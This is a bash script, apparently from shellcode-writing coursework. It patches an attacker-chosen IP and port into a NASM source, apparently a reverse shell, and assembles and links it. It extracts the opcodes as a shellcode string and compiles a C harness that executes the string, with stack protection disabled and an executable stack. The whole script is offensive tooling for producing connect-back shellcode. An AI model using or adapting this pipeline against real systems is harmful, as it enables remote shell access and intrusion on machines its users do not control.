#!/bin/bash
echo 'Usage ./all_compile.sh source_file IP portnumber. E.g. ./all_compile.sh reverse 127.0.0.1 12345 where reverse.nasm is the source file'

function atoi
{
	#Returns the integer representation of an IP arg, passed in ascii dotted-decimal notation (x.x.x.x)
	IP=$1; IPNUM=0
	for (( i=0 ; i<4 ; ++i )); do
		((IPNUM+=${IP%%.*}*$((256**$((3-${i}))))))
		IP=${IP#*.}
	done
	echo $IPNUM 
} 

cp $1.nasm $1.nasm_orig

res=$(atoi $2)
ip=`printf '%08x\n' $res|sed -r s/\([0-9a-f]{2}\)\([0-9a-f]{2}\)\([0-9a-f]{2}\)\([0-9a-f]{2}\)/\\\4\\\3\\\2\\\1/`
echo IP in reverse hex: $ip

sed s/0x0100007f/0x$ip/ < $1.nasm > $1.nasm_
cp $1.nasm_ $1.nasm

port=`printf '%04x\n' $3|sed -r s/\([0-9a-f][0-9a-f]\)\([0-9a-f][0-9a-f]\)/\\\2\\\1/`
echo Port in reverse hex: $port

sed s/0xbabe/0x$port/ < $1.nasm > $1.nasm_
cp $1.nasm_ $1.nasm

cat $1.nasm | grep 'push word 0x'

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm

echo '[+] Linking ...'
ld -melf_i386 -o $1 $1.o

echo '[+] Dumping shellcode ...'

echo '' > shellcode.asm
for i in `objdump -d $1 | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" >> shellcode.asm; done


echo '[+] Creating new shellcode.c ...'

cat > shellcode.c <<EOF
#include<stdio.h>
#include<string.h>

unsigned char code[] ="\\
EOF
echo -n "\\" >> shellcode.c
cat shellcode.asm >> shellcode.c

cat >> shellcode.c <<EOF
";
main()
{

        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
EOF

echo '[+] Compiling shellcode.c ...'
gcc -fno-stack-protector -z execstack -m32 -o shellcode shellcode.c

echo '[+] Done! Run ./shellcode to execute!'
